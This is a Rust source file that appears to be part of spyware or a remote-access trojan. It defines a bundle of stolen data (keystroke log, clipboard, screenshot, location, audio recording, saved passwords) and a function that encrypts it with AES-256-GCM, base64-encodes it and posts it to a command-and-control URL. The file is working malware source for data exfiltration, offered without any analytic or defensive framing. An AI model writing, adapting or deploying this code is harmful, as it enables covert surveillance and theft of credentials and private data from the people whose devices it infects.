use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use base64::{Engine as _, engine::general_purpose};
use rand::Rng;
use reqwest::Client;
use serde_json::json;

use crate::passwords::PasswordEntry;

#[derive(serde::Serialize)]
pub struct ExfilData {
    pub timestamp: u64,
    pub hostname: String,
    pub keylog: String,
    pub clipboard: String,
    pub screenshot: String,
    pub location: String,
    pub audio: String,
    pub passwords: Vec<PasswordEntry>,
}

pub async fn exfil_data(data: ExfilData, c2_url: &str, encryption_key: &[u8; 32]) {
    let client = Client::new();
    let json = json!(data);
    let encrypted = encrypt(json.to_string().as_bytes(), encryption_key);
    let b64 = general_purpose::STANDARD.encode(encrypted);
    let _ = client.post(c2_url)
        .json(&json!({ "data": b64 }))
        .send()
        .await;
}

fn encrypt(data: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = rand::thread_rng().gen::<[u8; 12]>();
    let nonce_s = Nonce::from_slice(&nonce);
    let ct = cipher.encrypt(nonce_s, data).unwrap();
    let mut out = nonce.to_vec();
    out.extend(ct);
    out
}